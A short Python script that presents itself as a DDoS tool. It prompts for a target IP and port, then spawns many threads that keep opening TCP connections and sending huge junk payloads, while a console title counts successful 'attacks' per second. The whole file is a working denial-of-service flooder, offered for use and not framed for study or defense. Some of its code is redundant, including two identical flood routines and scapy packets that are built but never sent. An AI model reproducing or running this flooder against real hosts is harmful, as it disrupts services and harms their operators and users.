import socket,os,ctypes,colorama,scapy.all,time
import threading
from colorama import Fore, Style
clear = lambda: os.system('cls')
clear()
clear()
print("""
<*> DDOS Ru ning
<*> R/s = How many attacks per  second
<*> The best Thread 10 - 20
""")
e=0
th = int(input('[=]  Thread : '))
class ddos:
  def __init__(self):
      self.d=0
      self.f=0
      self.e=0
      self.ipp = input(f'{Style.BRIGHT} {Fore.RED}ip Target :')
      self.PORT = int(input(f'{Style.DIM}{Fore.CYAN}port : '))
  def rs(self):
    while 1:
      gg = self.f
      time.sleep(1)
      self.rse = self.f - gg
      print(f"\r [<>] R/S > {self.rse}", end="")
  def dd(self):
    while 1:
      ctypes.windll.kernel32.SetConsoleTitleW(str('Done attacked for ip >> {} | Error Attack {}  By 6g7r <; '.format(self.d, self.e)))

  def DDos(self):
    while 1:
      try:

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        sock.connect((self.ipp, self.PORT))
        dataa = b'ehyrteuyiesuyhptuyh' * 10000000
        send = (scapy.all.IP(dst=self.ipp) / scapy.all.TCP(dport=80))
        sock.send(dataa)
        self.d += 1
        self.f += 1
      except:
        self.e += 1
  def DDos2(self):
    while 1:
      try:

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        sock.connect((self.ipp, self.PORT))
        dataa = b'ehyrteuyiesuyhptuyh' * 10000000
        send = (scapy.all.IP(dst=self.ipp) / scapy.all.TCP(dport=80))
        sock.send(dataa)
        self.d += 1
        self.f += 1
      except:
        self.e += 1


d=ddos()
for _ in range(th):
    threading.Thread(target=d.DDos).start()
    threading.Thread(target=d.DDos2).start()
    threading.Thread(target=d.dd).start()
    threading.Thread(target=d.rs).start()
